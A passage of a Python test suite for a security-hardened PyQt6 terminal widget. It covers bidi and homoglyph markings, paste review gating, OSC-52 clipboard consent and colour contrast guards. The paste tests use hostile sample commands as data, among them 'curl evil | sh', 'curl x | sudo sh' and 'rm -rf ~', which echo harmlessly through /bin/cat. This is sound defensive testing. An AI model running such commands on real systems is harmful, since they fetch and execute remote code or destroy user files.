eq(insh._cp_at(insh.cursorRect(_shcur).center()), 0x0416,
   '_cp_at reads a shown glyph via its own codepoint (show mode, no tag)')
# markings off + ANSI colours on: the marking keeps the program's own foreground
# (not dropped to a blank format) and still carries the codepoint (codex P2 fix).
from PyQt6.QtCore import QPoint                           # noqa: E402
_sgrk = tuple(sorted({'fg': 1, 'bg': None, 'bold': False}.items()))
_mfmt = SecureTerminal(command='/bin/cat')._fmt_from_key((_S.MARK_KEY, _sgrk, 0x202E))
eq(_mfmt.foreground().color().name(), '#cd0000',
   'markings off + colours on keeps the program ANSI colour on the marking')
eq(_mfmt.property(_CP_PROP), 0x202E, 'and the marking still carries the codepoint')
# the hit-test targets ONLY the character under the point, never its neighbour: a
# point over "_" reads the RLO, a point over the adjacent ASCII reads nothing
# (codex P2: probing both sides bled the popup into adjacent glyphs).
inb = SecureTerminal(command='/bin/cat')
inb.apply_mode('box')
inb._append('a' + chr(0x202E) + 'b')                     # -> 'a_b'
inb.resize(600, 200)
inb.show()
pump(30)


def _midpt(term, i):
    _c0 = QTextCursor(term.document())
    _c0.setPosition(i)
    _c1 = QTextCursor(term.document())
    _c1.setPosition(i + 1)
    _r0 = term.cursorRect(_c0)
    _r1 = term.cursorRect(_c1)
    return QPoint((_r0.x() + _r1.x()) // 2, _r0.center().y())


eq(inb._cp_at(_midpt(inb, 1)), 0x202E, 'a point over "_" reads the RLO codepoint')
ok(inb._cp_at(_midpt(inb, 0)) is None, 'a point over the adjacent "a" is not the marking')
ok(inb._cp_at(_midpt(inb, 2)) is None, 'a point over the adjacent "b" is not the marking')
# _run_cp_at's no-run fall-through: a position in a block that no run covers (an
# empty grid document right after a reset) has no source code point.
_ecp = SecureTerminal(command='/bin/cat', tui=True)
_ecp.apply_mode('show')
_ecp.resize(300, 200)
_ecp.show()
pump(20)
_ecp._reset_grid_view()                                  # empty document, no runs
ok(_ecp._run_cp_at(0) is None,
   '_run_cp_at returns None where no run covers the position (empty grid)')
_ecp.shutdown()
# an astral glyph (2 UTF-16 units) in show mode is hit-tested as ONE character:
# the whole code point, never a lone surrogate half (codex P2 fix).
ina = SecureTerminal(command='/bin/cat')
ina.apply_mode('show')
ina._append('x' + chr(0x1F600) + 'y')                    # emoji between two ASCII
ina.resize(600, 200)
ina.show()
pump(30)
_ea = QTextCursor(ina.document())
_ea.setPosition(1)                                       # boundary before the emoji
_eb = QTextCursor(ina.document())
_eb.setPosition(3)                                       # boundary after its 2 units
_emid = QPoint((ina.cursorRect(_ea).x() + ina.cursorRect(_eb).x()) // 2,
               ina.cursorRect(_ea).center().y())
eq(ina._cp_at(_emid), 0x1F600, 'a whole astral glyph is recovered (not a lone surrogate)')
# the active popup describes the character and copies its ESCAPE (never the raw
# glyph -- putting a bidi override / homoglyph on the clipboard is the hazard).
ins._show_char_popup(0x202E, ins.mapToGlobal(ins.rect().center()))
eq(ins._char_popup.windowTitle(), 'Character U+202E', 'popup is titled by codepoint')
_lbl = ins._char_popup.findChild(QLabel)
ok('RIGHT-TO-LEFT OVERRIDE' in _lbl.text() and 'bidirectional' in _lbl.text(),
   'popup names the character and its risk class')
_copy = [b for b in ins._char_popup.findChildren(QPushButton)
         if b.text().startswith('Copy')][0]
_copy.click()
eq(QGuiApplication.clipboard().text(), '\\u202e',
   'copy puts the \\uXXXX escape (not the raw glyph) on the clipboard')
ins._char_popup.close()
# a double-click on a marking opens its popup; elsewhere it falls through
_dc = []
ins._show_char_popup = lambda cp, pt: _dc.append(cp)
ins._cp_at = lambda pos: 0x202E
_dbl = QMouseEvent(QEvent.Type.MouseButtonDblClick, QPointF(5, 5), QPointF(5, 5),
                   Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                   Qt.KeyboardModifier.NoModifier)
ins.mouseDoubleClickEvent(_dbl)
eq(_dc, [0x202E], 'double-click on a marking opens its inspection popup')
# line mirror + paste safety at a bare CLI prompt. The terminal here runs /bin/cat,
# which only echoes -- no typed string is ever executed.
cw = SecureTerminal(command='/bin/cat')
_hsent = spy_writes(cw)
# The line mirror tracks typed input at a bare shell prompt (no foreground program);
# simulate it (a real login-shell tab reads has_foreground_program() False there).
cw.has_foreground_program = lambda: False


def _htype(term, text):
    for _ch in text:
        key(term, Qt.Key.Key_A, _ch)


_htype(cw, 'ls')
key(cw, Qt.Key.Key_Return)
ok(b'\r' in _hsent, 'Enter submits the typed line')
_hsent.clear()

# Ctrl+\ (SIGQUIT): whether the tty flushes or RETAINS the pending line is tty/shell-
# dependent (NOFLSH off flushes; `stty noflsh` or bash trapping SIGQUIT RETAINS it) and
# unobservable to us. So the line is marked UNVERIFIABLE, keeping _line_pending() aware a
# retained line may sit at the prompt (so a CR-terminated re-export is not typed onto it).
_sq = SecureTerminal(command='/bin/cat')
_sq.has_foreground_program = lambda: False
_sqs = spy_writes(_sq)
_htype(_sq, 'safe')
ok(_sq._line_buffer == 'safe', 'the mirror holds the typed prefix before Ctrl+\\')
key(_sq, Qt.Key.Key_Backslash, mods=Qt.KeyboardModifier.ControlModifier)
ok(b'\x1c' in b''.join(_sqs), 'Ctrl+\\ sends SIGQUIT (0x1c) to the child')
ok(_sq._line_dirty,
   'Ctrl+\\ marks the line unverifiable (SIGQUIT may RETAIN the line under noflsh)')
_sq.close()

# desync fail-safe: Tab completion and readline control edits rewrite the shell's line
# without updating _line_buffer, so the mirror is marked unverifiable -- _line_pending()
# must then assume the prompt holds text it cannot see.
_ctrl_mod = Qt.KeyboardModifier.ControlModifier
cw._line_buffer = 'dd of=/dev/sd'
cw._line_dirty = False
key(cw, Qt.Key.Key_Tab, '\t')
ok(cw._line_dirty, 'Tab completion marks the line unverifiable')
cw._line_dirty = False
key(cw, Qt.Key.Key_A, mods=_ctrl_mod)                # Ctrl+A: move-to-start (readline)
ok(cw._line_dirty, 'a readline control edit (Ctrl+A) marks the line unverifiable')
cw._line_dirty = False
key(cw, Qt.Key.Key_BracketRight, '\x1d', mods=_ctrl_mod)   # generic control edit
ok(cw._line_dirty, 'a generic control edit marks the line unverifiable')
cw._line_dirty = False
cw._line_buffer = 'x'
key(cw, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U: full-line discard
ok(not cw._line_dirty and cw._line_buffer == '',
   'Ctrl+U discards the line and stays clean (nothing stale)')
# Ctrl+U's reach is cursor-dependent (bash unix-line-discard kills only cursor-to-start),
# so it must NOT clear an ALREADY-dirty flag: Home (dirty) then Ctrl+U can leave a survivor
# in the shell, so _line_pending() must keep reporting the prompt as held.
cw._line_buffer = 'rm -rf ~/important'
cw._line_dirty = True                                # cursor moved (e.g. Home/Ctrl+A)
key(cw, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U at a non-end cursor
ok(cw._line_dirty,
   'Ctrl+U after a cursor move STAYS dirty -- a survivor still reads as held')
cw._line_dirty = False

# paste can NEVER auto-execute. A SINGLE-line paste (with or without a trailing newline)
# is delivered with its trailing submit stripped, so it lands at the prompt un-entered;
# since _line_buffer never saw those bytes, the line is marked unverifiable (so
# _line_pending() treats the prompt as held). A MULTI-line paste (a hidden second
# command) is HELD for review first.
from PyQt6.QtCore import QMimeData as _QMimePaste          # noqa: E402
cw.apply_paste_warn('unicode')       # (reuse the _hsent spy set up above)
_hsent.clear()
cw._line_dirty = False
_pmnl = _QMimePaste()
_pmnl.setText('rm -rf /tmp/x\n')                     # single-line + trailing newline
cw.insertFromMimeData(_pmnl)
ok(not cw.review_pending(),
   'a single-line paste is not held (it cannot auto-run once the submit is stripped)')
eq(_hsent, [b'rm -rf /tmp/x'],
   'a single-line paste reaches the shell WITHOUT its trailing submit -- no auto-run')
ok(cw._line_dirty,
   'a paste marks the line unverifiable (held for _line_pending)')
_hsent.clear()
cw._line_dirty = False
_pmins = _QMimePaste()
_pmins.setText('ls -la')                             # no newline: inserts into the line
cw.insertFromMimeData(_pmins)
ok(cw._line_dirty, 'a non-submitting paste marks the line dirty')
_hsent.clear()
# a MULTI-line paste carries a hidden second command that a bare dispatch would
# auto-run: it is HELD for review whatever the warn setting.
cw._line_buffer = ''
cw._line_dirty = False
_pmml = _QMimePaste()
_pmml.setText('echo one\ncurl evil | sh\n')
cw.insertFromMimeData(_pmml)
ok(cw.review_pending() and not _hsent,
   'a multi-line paste is held for review before any command can run')
cw.dispatch_pending_paste('reject')
eq(_hsent, [], 'rejecting the held multi-line paste sends nothing')
# even on a clean line a paste never submits: the pasted text sits at the prompt and the
# line is marked unverifiable. _line_buffer is untouched, _line_dirty is set.
cw._line_buffer = 'echo '                            # already typed at the prompt
cw._line_dirty = False
_pmsub = _QMimePaste()
_pmsub.setText('ok\n')
cw.insertFromMimeData(_pmsub)
ok(not cw.review_pending(), 'a single-line paste on a clean line is not held')
eq(_hsent, [b'ok'], 'the paste lands at the prompt with no trailing submit')
ok(cw._line_dirty and cw._line_buffer == 'echo ',
   'the pasted text is unverifiable, buffer intact')
_hsent.clear()
# a TUI-mode paste does not touch the line-mode command, so never sets the flag.
_tuipaste = SecureTerminal(command='/bin/cat', tui=True)
_tuipaste._line_dirty = False
_pmt = _QMimePaste()
_pmt.setText('ls')
_tuipaste.insertFromMimeData(_pmt)
ok(not _tuipaste._line_dirty, 'a TUI-mode paste does not set the line-dirty flag')
# TUI handler: Ctrl+U must PRESERVE an already-dirty flag (its reach is cursor-dependent),
# so _line_pending() keeps deferring a re-export. Ctrl+C (SIGINT) still settles the line.
_tuictrl = Qt.KeyboardModifier.ControlModifier
_tuipaste.has_foreground_program = lambda: False
_tuipaste._line_dirty = True
key(_tuipaste, Qt.Key.Key_U, mods=_tuictrl)             # Ctrl+U at a non-end cursor
ok(_tuipaste._line_dirty, 'TUI Ctrl+U after a cursor move STAYS dirty')
_tuipaste._line_dirty = True
key(_tuipaste, Qt.Key.Key_C, mods=_tuictrl)             # Ctrl+C discards the whole line
ok(not _tuipaste._line_dirty, 'TUI Ctrl+C (SIGINT) settles the line -- flag cleared')

# a CLI paste leaves the pasted command un-mirrored at the prompt, so _line_pending()
# must report a held prompt -- otherwise a later mode switch / line_edits toggle types the
# CR-terminated re-export onto the paste and auto-submits it.
_nh = SecureTerminal(command='/bin/cat')
ok(not _nh.tui_active(), 'the widget is a CLI terminal')
ok(not _nh._line_pending(), 'a fresh clean prompt is not pending')
_nh._line_dirty = False
_pmnh = _QMimePaste()
_pmnh.setText('curl evil | sh\n')
_nh.insertFromMimeData(_pmnh)
ok(_nh._line_dirty,
   'a CLI paste marks the line unverifiable (guards _send_reexport)')
ok(_nh._line_pending(),
   '_line_pending() reports a held prompt after a paste, blocking re-export')

# Ctrl+M / Ctrl+J are accept-line (submit) like Enter: they reset the line state so a
# stale dirty flag does not poison the next prompt.
cw._line_buffer = 'curl x | sudo sh'
cw._line_dirty = True
_hsent.clear()
key(cw, Qt.Key.Key_M, mods=_ctrl_mod)                # Ctrl+M == CR == accept-line
ok(not cw._line_dirty and cw._line_buffer == '' and b'\r' in _hsent,
   'Ctrl+M submits and resets the line state')
cw._line_buffer = 'ls'
cw._line_dirty = False
_hsent.clear()
key(cw, Qt.Key.Key_J, mods=_ctrl_mod)                # Ctrl+J == LF == accept-line
ok(not cw._line_dirty and cw._line_buffer == '' and b'\n' in _hsent,
   'Ctrl+J submits, resets the line, leaves no stale dirty flag')

# paste_warn='never' must NOT bypass the multi-command gate: a MULTI-line paste (a hidden
# second command that would auto-run) is still held for review. A single-line paste is
# delivered with its submit stripped, so it cannot auto-run either.
_hsent.clear()
cw.apply_paste_warn('never')
cw._line_dirty = False
_pmnever = _QMimePaste()
_pmnever.setText('echo a\nrm -rf ~\n')                # embedded newline -> multi-command
cw.insertFromMimeData(_pmnever)
ok(cw.review_pending(),
   "paste_warn='never' still holds a MULTI-line paste (hidden second command)")
cw.dispatch_pending_paste('reject')
eq(_hsent, [], 'the rejected multi-line paste sends nothing to the shell')
# a single-line paste under 'never' is NOT held -- delivered without its submit.
cw._line_dirty = False
_pmnever1 = _QMimePaste()
_pmnever1.setText('rm -rf ~\n')
cw.insertFromMimeData(_pmnever1)
ok(not cw.review_pending(), "paste_warn='never': a single-line paste is not held")
eq(_hsent, [b'rm -rf ~'],
   "even under 'never' a single-line paste reaches the shell WITHOUT its submit")
_hsent.clear()
cw.apply_paste_warn('unicode')


# OSC-52 reply truncation: a slow/gone child can leave the ~87 KiB reply truncated, its
# buffered prefix then lacking the OSC terminator -- a dangling escape that swallows the
# next pty reader's output. A truncated write (_write returns False) is best-effort
# re-terminated; a full write appends no spurious terminator.
_clp = SecureTerminal(command='/bin/cat')
QGuiApplication.clipboard().setText('S3CRET' * 200)
_clpw = []
def _trunc_write(_data):
    _clpw.append(bytes(_data))
    return len(_clpw) != 1            # the reply (first call) truncates; the rest write
_clp._write = _trunc_write
_clp._last_clip_read = 0              # bypass the 1s rate limit
_clp._reply_clipboard()
ok(len(_clpw) == 2 and _clpw[0].startswith(b'\x1b]52;c;') and _clpw[1] == b'\x07',
   'a truncated OSC-52 reply is best-effort re-terminated (no dangling escape)')
_clpw2 = []
_clp._write = lambda _d: (_clpw2.append(bytes(_d)) or True)   # a full write
_clp._last_clip_read = 0
_clp._reply_clipboard()
ok(len(_clpw2) == 1, 'a fully-written OSC-52 reply appends no extra terminator')
_clp.close()

# SEC-1: OSC-52 clipboard-read consent is a TOCTOU. osc_clipboard_read can be disabled
# WHILE the consent dialog is open; a later Allow must NOT answer the stale READ query.
_ctc = SecureTerminal(command='/bin/cat')
_ctc.apply_osc('osc_clipboard_read', True)
QGuiApplication.clipboard().setText('S3CRET')
_ctcw = []
_ctc._write = lambda _d: (_ctcw.append(bytes(_d)) or True)
_ctc._last_clip_read = 0
_ctc._clipboard_read = 'pending'                       # a consent dialog is open
_ctc.apply_osc('osc_clipboard_read', False)            # feature disabled while it is open
ok(_ctc._clipboard_read is None,
   'SEC-1: disabling osc_clipboard_read drops the in-flight pending consent')
_ctc.grant_clipboard_read(_ctc.CLIP_ALLOW_ALWAYS)      # user clicks Allow on the stale dialog
ok(not any(b'\x1b]52;c;' in _w for _w in _ctcw),
   'SEC-1: a grant after the feature was disabled writes NO OSC-52 reply (no clipboard exfil)')
# guard-only path: force pending with the feature already off, grant re-checks the flag
_ctc._osc['osc_clipboard_read'] = False
_ctc._clipboard_read = 'pending'
_ctc._last_clip_read = 0                                # else the 1s rate-limit masks a reply
_ctcw.clear()
_ctc.grant_clipboard_read(_ctc.CLIP_ALLOW_ONCE)
ok(not any(b'\x1b]52;c;' in _w for _w in _ctcw),
   'SEC-1: grant_clipboard_read re-checks the feature flag and withholds the reply when off')
_ctc.close()

# SEC-1 (stale dialog): a consent dialog whose request was ABANDONED (osc_clipboard_read
# disabled) must NOT grant the tab after a re-enable -- a disable+re-enable+stale-allow-always
# would else grant allow-always and the next read would reply with no fresh prompt.
_cts = SecureTerminal(command='/bin/cat')
_cts.apply_osc('osc_clipboard_read', True)
_cts._clipboard_read = 'pending'                       # a consent dialog is open
_cts.apply_osc('osc_clipboard_read', False)            # abandon it (pending -> None)
_cts.apply_osc('osc_clipboard_read', True)             # re-enable
_cts.grant_clipboard_read(_cts.CLIP_ALLOW_ALWAYS)      # stale Allow-Always click
ok(_cts._clipboard_read is None,
   'SEC-1: a stale allow-always (dialog abandoned by a disable) does NOT grant the tab')
_ctsw = []
_cts._write = lambda _d: (_ctsw.append(bytes(_d)) or True)
_cts._last_clip_read = 0
_cts._osc_clipboard_read()                             # the next OSC-52 read query
ok(_cts._clipboard_read == 'pending' and not any(b'\x1b]52;c;' in _w for _w in _ctsw),
   'SEC-1: after a stale grant the next read RE-ASKS (pending), it does not auto-reply')
_cts.close()

# F5: reap_pty_children WNOHANG-reaps ONLY our registered pty children, so the app can
# drop the blanket SIGCHLD=SIG_IGN that made every subprocess returncode read 0. Pin
# SIGCHLD to its default here so reaping is deterministic (an ambient SIG_IGN would let
# the kernel auto-reap our probe children before we waitpid them).
import time as _t5                                            # noqa: E402
_f5_prev_chld = signal.getsignal(signal.SIGCHLD)
signal.signal(signal.SIGCHLD, signal.SIG_DFL)
try:
    _dead = os.posix_spawn('/bin/true', ['/bin/true'], os.environ)   # exits -> zombie
    _t5.sleep(0.2)
    SecureTerminal._LIVE_PTY_PIDS.add(_dead)
    SecureTerminal.reap_pty_children()
    ok(_dead not in SecureTerminal._LIVE_PTY_PIDS,
       'reap_pty_children reaps and drops an exited pty child')
    _alive = os.posix_spawn('/bin/sleep', ['/bin/sleep', '30'], os.environ)
    SecureTerminal._LIVE_PTY_PIDS.add(_alive)
    SecureTerminal.reap_pty_children()
    ok(_alive in SecureTerminal._LIVE_PTY_PIDS,
       'reap_pty_children keeps a still-running pty child registered')
    os.kill(_alive, signal.SIGKILL)
    os.waitpid(_alive, 0)
    SecureTerminal._LIVE_PTY_PIDS.discard(_alive)
    _gone = 2147480000                                       # a pid that is not our child
    SecureTerminal._LIVE_PTY_PIDS.add(_gone)
    SecureTerminal.reap_pty_children()
    ok(_gone not in SecureTerminal._LIVE_PTY_PIDS,
       'reap_pty_children drops a pid that is not (or no longer) our child')
    # a spawned tab registers its pty pid; shutdown() reaps a dead child (reaped branch)
    _rt = SecureTerminal(command='/bin/cat')
    _rt_pid = _rt._pid
    ok(_rt_pid in SecureTerminal._LIVE_PTY_PIDS,
       'a spawned tab registers its pty child for reaping')
    os.kill(_rt_pid, signal.SIGKILL)
    _t5.sleep(0.2)                                           # let it die -> a zombie
    _rt.shutdown()
    ok(_rt_pid not in SecureTerminal._LIVE_PTY_PIDS,
       'shutdown() reaps and unregisters an exited pty child')
    # shutdown() tolerates a child already reaped elsewhere (the ECHILD branch)
    _rt2 = SecureTerminal(command='/bin/cat')
    _rt2_pid = _rt2._pid
    os.kill(_rt2_pid, signal.SIGKILL)
    os.waitpid(_rt2_pid, 0)                                  # reap it out from under shutdown()
    _rt2.shutdown()
    ok(_rt2_pid not in SecureTerminal._LIVE_PTY_PIDS,
       'shutdown() tolerates a pty child already reaped elsewhere')
    # shutdown() while the child is still alive: WNOHANG reaps nothing (0, 0), so the pid
    # stays registered for the app's SIGCHLD handler (the not-yet-dead branch)
    _rt3 = SecureTerminal(command='/bin/cat')
    _rt3_pid = _rt3._pid
    _orig_waitpid = os.waitpid
    os.waitpid = lambda _p, _f: (0, 0)                      # pretend the child is still alive
    try:
        _rt3.shutdown()
    finally:
        os.waitpid = _orig_waitpid
    ok(_rt3_pid in SecureTerminal._LIVE_PTY_PIDS,
       'shutdown() leaves a still-running pty child registered for the handler')
    os.kill(_rt3_pid, signal.SIGKILL)                       # clean up the real (still-live) child
    os.waitpid(_rt3_pid, 0)
    SecureTerminal._LIVE_PTY_PIDS.discard(_rt3_pid)
finally:
    signal.signal(signal.SIGCHLD, _f5_prev_chld)

# a second paste arriving while a review is already open is ignored, not allowed to
# clobber the pending one (input is otherwise suspended during a review).
_rev = SecureTerminal(command='/bin/cat')
_rev.apply_paste_warn('always')
_pmrev1 = _QMimePaste()
_pmrev1.setText('first-paste')
_rev.insertFromMimeData(_pmrev1)
ok(_rev.review_pending(), 'first paste opens a review')
_pmrev2 = _QMimePaste()
_pmrev2.setText('second-paste')
_rev.insertFromMimeData(_pmrev2)                     # arrives during the open review
ok(_rev.review_pending() and _rev._pending_paste == 'first-paste',
   'a second paste during an open review is ignored (pending paste unchanged)')
_rev.dispatch_pending_paste('reject')

# --- colours: SGR run formatting + contrast guard -----------------------------
from PyQt6.QtGui import QTextCursor as _QTC              # noqa: E402


def _fmt_of_char(term, ch):
    doc = term.toPlainText()
    idx = doc.index(ch)
    cur = term.textCursor()
    cur.setPosition(idx)
    cur.setPosition(idx + 1, _QTC.MoveMode.KeepAnchor)
    return cur.charFormat()


col = SecureTerminal(command='/bin/cat')
col.apply_colors(True)
col.apply_theme('dark')
col._append('\x1b[31mR\x1b[0m')          # red R via SGR, through the cell model
eq(_fmt_of_char(col, 'R').foreground().color().name(), '#cd0000', 'red run fg')
col2 = SecureTerminal(command='/bin/cat')
col2.apply_colors(True)
col2.apply_theme('dark')
col2._append('\x1b[30mH\x1b[0m')         # black-on-dark must be contrast-guarded
ok(_fmt_of_char(col2, 'H').foreground().color().name() != '#000000',
   'black-on-dark guarded')

# --- leftover colour must not bleed into the shell's next prompt --------------
# A program (here a hostile log) sets a background colour and exits WITHOUT
# resetting it. A normal terminal leaves that colour "stuck", so the shell's next
# prompt inherits it. secure-terminal resets the leftover at the prompt boundary
# (the bracketed-paste marker every shell line editor emits before a prompt), so
# the prompt renders on the default background -- while the program's OWN coloured
# output is untouched (shown, contrast-guarded, not stripped). This is the FULL
# _on_readable path (feed_output), where the reset injection lives; earlier tests
# only fed one-shot streams with no following prompt, so this case was uncovered.
lo = SecureTerminal(command='/bin/cat')
lo.apply_colors(True)
lo.apply_theme('dark')
feed_output(lo, b'\x1b[31;41mALERT\n\x1b[?2004hPS> ')
_alert_bg = _fmt_of_char(lo, 'A').background()
ok(_alert_bg.style() != Qt.BrushStyle.NoBrush,
   'leftover colour: the program\'s own background colour is preserved (shown)')
_prompt_bg = _fmt_of_char(lo, 'P').background()
ok(_prompt_bg.style() == Qt.BrushStyle.NoBrush
   or _prompt_bg.color().name() != _alert_bg.color().name(),
   'leftover colour: the prompt after the marker is NOT on the stuck background')
# without the marker the stream is unchanged (shells that do not use bracketed
# paste keep the old readable-but-stuck behaviour; no spurious reset injected).
eq(lo._reset_leftover_sgr('\x1b[41mx'), '\x1b[41mx',
   'leftover colour: no prompt marker -> stream passes through unchanged')
eq(lo._reset_leftover_sgr('out\x1b[?2004hPS> '),
   'out\x1b[0m\x1b[?2004hPS> ',
   'leftover colour: an SGR reset is injected at the prompt marker')

# --- a prompt after output with NO trailing newline starts on a fresh line ----
# `head -c N /dev/urandom` emits no trailing newline, so stock bash glues its
# next prompt onto the last output byte. At the prompt-start marker, end that
# mid-line so the prompt gets its own line -- and do nothing when already at
# column 0 (e.g. output that ended in a newline, or zsh's PROMPT_SP).
_DFLT = {'fg': None, 'bg': None, 'bold': False}
_nc, _nk, _, _, _ = _S.feed_line_edits([], 0, dict(_DFLT), 'abc' + _S.PROMPT_START + 'PS> ')
eq([''.join(c for c, _ in ln) for ln in _nc], ['abc'],
   'prompt newline: un-terminated output before the marker is ended into its line')
eq(''.join(c for c, _ in _nk), 'PS> ',
   'prompt newline: the prompt starts on a fresh line, not glued to the output')
_zc, _zk, _, _, _ = _S.feed_line_edits([], 0, dict(_DFLT), 'abc\n' + _S.PROMPT_START + 'PS> ')
eq([''.join(c for c, _ in ln) for ln in _zc], ['abc'],
   'prompt newline: a trailing newline already ended the line -- no spurious blank')
# zsh/zle emits the bracketed-paste marker AFTER printing the prompt (bash sends
# it before). With no printable text after the marker the prompt is already on
# the row, so flushing here would push it onto its own line and drop the cursor
# below it (the reported bug). It must NOT be flushed.
_zsh_raw = '[user ~]% ' + _S.PROMPT_START
_zshc, _zshk, _zshcol, _, _ = _S.feed_line_edits([], 0, dict(_DFLT), _zsh_raw)
eq([''.join(c for c, _ in ln) for ln in _zshc], [],
   'zsh prompt: a marker AFTER the prompt does not flush the prompt onto its own line')
eq(''.join(c for c, _ in _zshk), '[user ~]% ',
   'zsh prompt: the prompt stays on the current row with the cursor after it')
eq(_zshcol, len('[user ~]% '), 'zsh prompt: the cursor column is at the prompt end')
# still not flushed when only escapes (no printable text) follow the marker
_zec, _zek, _, _, _ = _S.feed_line_edits(
    [], 0, dict(_DFLT), '[user ~]% ' + _S.PROMPT_START + '\x1b[0m')
eq(''.join(c for c, _ in _zek), '[user ~]% ',
   'zsh prompt: a trailing SGR after the marker still does not flush')

# --- security: an app cannot recolour or HIDE a neutralised marking -----------
# A marking (the box glyph, or a Reveal/Detail <U+XXXX> badge -- same key, so the
# same rules across every display mode). With coloured markings ON (default) it
# is coloured by its RISK CLASS, never by the SGR an app set around it, so hostile
# output can neither recolour a box to blend in nor forge one. With markings OFF
# (app colours on) a box takes the app colour but through the contrast guard, so
# it still cannot be painted invisible.
mk = SecureTerminal(command='/bin/cat')
mk.apply_colors(True)
mk.apply_theme('dark')
_bidi = (_S.MARK_KEY, 'bidi', 0x202E)                 # a RIGHT-TO-LEFT OVERRIDE
eq(mk._fmt_from_key(_bidi).foreground().color().name(), mark_fg(mk, 'bidi'),
   'marking: coloured by risk class (bidi), an app cannot recolour it')
# On the dark theme a dangerous class carries a risk-class background BAND (a fg-only
# tint was optically swallowed by the near-black base). The band is OURS, by class --
# an app still cannot control it; it is not the app's SGR.
eq(mk._fmt_from_key(_bidi).background().color().name(), mark_bg(mk, 'bidi'),
   'marking: a bidi box wears the risk-class band on the dark theme, not an app colour')
_risk_classes = ('bidi', 'invisible', 'control', 'nonascii', 'confusable', 'combining')
_risk_cols = [mk._fmt_from_key((_S.MARK_KEY, c, 0x41)).foreground().color().name()
              for c in _risk_classes]
eq(len(set(_risk_cols)), len(_risk_classes),
   'marking: the six risk classes get six distinct colours')
ok(all(c in mk.MARKING_COLORS[mk._theme] for c in _risk_classes),
   'marking: every risk class has a configured colour')
# a homoglyph (confusable) is flagged in a DIFFERENT colour than honest foreign text
ok(mark_fg(mk, 'confusable') != mark_fg(mk, 'nonascii'),
   'marking: a look-alike (confusable) is louder than plain non-ASCII, not the same colour')
# a combining mark (Zalgo) is split off from honest foreign text: its own class,
# its own louder colour -- the taxonomy collision that made marks vanish is gone.
ok(mark_fg(mk, 'combining') != mark_fg(mk, 'nonascii'),
   'marking: a combining mark is its own class, louder than plain non-ASCII')
# markings OFF: the box carries the app's own SGR -- an app trying to hide it by
# painting it its background colour is still forced readable by the contrast guard.
_hide = tuple(sorted({'fg': 0, 'bg': 0, 'bold': False}.items()))    # black-on-black
_hf = mk._fmt_from_key((_S.MARK_KEY, _hide, 0x202E))
ok(_hf.background().style() == Qt.BrushStyle.NoBrush
   or _hf.foreground().color().name() != _hf.background().color().name(),
   'marking: an app colour on a box is contrast-guarded -- fg never equals bg')

# --- every theme: risk-class marking colours stay readable, and a hide attempt
# --- is guarded regardless of theme -------------------------------------------
# The risk colours are theme-keyed, and each fg must read on WHATEVER it is shown
# on: its risk-class band where one is set (the dark dangerous classes), else the
# theme base (light, and honest 'nonascii'). Pinned here per theme. The box-hiding
# guard must also hold in every theme, not just dark.
from secure_terminal.terminal import THEMES as _THEMES2, _rgb as _rgb4   # noqa: E402
from secure_terminal.sanitize import too_close as _tc4                   # noqa: E402
from PyQt6.QtGui import QColor as _QC4                                    # noqa: E402
_thmk = SecureTerminal(command='/bin/cat')
_thmk.apply_colors(True)
for _theme in ('dark', 'light'):
    _thmk.apply_theme(_theme)
    _bg_rgb = _rgb4(_QC4(_THEMES2[_theme][0]))
    for _cls, _spec in _thmk.MARKING_COLORS[_theme].items():
        _on = _rgb4(_QC4(_spec['bg'])) if _spec['bg'] is not None else _bg_rgb
        ok(not _tc4(_rgb4(_QC4(_spec['fg'])), _on),
           'marking colour %s reads on its %s-theme background' % (_cls, _theme))
    # a program painting a box its own bg colour is forced readable in this theme
    for _c in (0, 7, 15):
        _hk = tuple(sorted({'fg': _c, 'bg': _c, 'bold': False}.items()))
        _hfmt = _thmk._fmt_from_key((_S.MARK_KEY, _hk, 0x202E))
        _fg = _rgb4(_hfmt.foreground().color())
        _bgb = _hfmt.background()
        _bg = _rgb4(_bgb.color()) if _bgb.style() != Qt.BrushStyle.NoBrush else _bg_rgb
        ok(not _tc4(_fg, _bg),
           'hide attempt (palette %d on itself) is contrast-guarded on the %s theme'
           % (_c, _theme))
# apply_theme sets the expected base palette for each theme
for _theme, _base in (('dark', '#14161b'), ('light', '#ffffff')):
    _thmk.apply_theme(_theme)
    eq(_thmk.palette().color(_thmk.palette().ColorRole.Base).name(), _base,
       'apply_theme sets the %s base background' % _theme)

# the shipped default theme is LIGHT: a fresh widget with no theme configured comes
# up light (white base), not dark.
_deft = SecureTerminal(command='/bin/cat')
eq(_deft.current_theme(), 'light', 'a fresh widget defaults to the light theme')
eq(_deft.palette().color(_deft.palette().ColorRole.Base).name(), '#ffffff',
   'the default (light) theme paints a white base')
_deft.close()

# --- louder marking tint: BOTH themes give the dangerous classes a background BAND
# --- (a fg-only tint was optically swallowed by the base and vanished); honest
# --- 'nonascii' stays fg-only in both. Light is the shipped default, so its bands
# --- are the primary case. Exercise BOTH branches of the optional-band code (bg set
# --- / bg None) in BOTH renderers, on BOTH themes. A theme toggle clears both
# --- marking caches, so no stale band survives a switch.
_band = SecureTerminal(command='/bin/cat', tui=True)
_band.apply_mode('box')                       # neutralize -> risk-class colouring
_band.apply_markings(True)
for _bt in ('light', 'dark'):
    _band.apply_theme(_bt)
    # CLI line renderer (_fmt_from_key): a dangerous class wears its band; nonascii none.
    _cf = _band._fmt_from_key((_S.MARK_KEY, 'combining', 0x0301))
    eq(_cf.background().color().name(), mark_bg(_band, 'combining'),
       'line renderer: a combining marking wears its %s risk band (bg-set branch)' % _bt)
    _nf = _band._fmt_from_key((_S.MARK_KEY, 'nonascii', 0x4E2D))
    ok(_nf.background().style() == Qt.BrushStyle.NoBrush,
       'line renderer: honest nonascii stays fg-only on %s (bg-None branch)' % _bt)
    # TUI grid renderer (_grid_cell_format): the same two branches.
    _gc = _band._grid_cell_format(_FakeCell(chr(0x0301)), _BX)  # combining -> banded
    eq(_gc.background().color().name(), mark_bg(_band, 'combining'),
       'grid renderer: a combining cell wears its %s risk band (bg-set branch)' % _bt)
    _gn = _band._grid_cell_format(_FakeCell(chr(0x4E2D)), _BX)  # honest foreign -> none
    ok(_gn.background().style() == Qt.BrushStyle.NoBrush,
       'grid renderer: honest nonascii stays fg-only on %s (bg-None branch)' % _bt)
_band.close()

# --- paste gating (async review: hold, then dispatch a choice) ----------------
p = SecureTerminal(command='/bin/cat')
psent = spy_writes(p)
